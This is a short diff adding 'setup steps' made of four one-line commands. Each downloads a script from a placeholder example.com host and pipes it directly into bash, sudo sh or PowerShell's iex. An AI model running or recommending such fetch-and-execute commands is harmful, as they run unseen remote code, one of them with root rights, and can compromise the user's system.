@@ -1,0 +1,5 @@
+Setup steps:
+curl -fsSL https://get.example.com/install.sh | bash
+wget -qO- https://x.example.com/setup | sudo sh
+bash <(curl -s https://x.example.com/a.sh)
+irm https://x.example.com/a.ps1 | iex
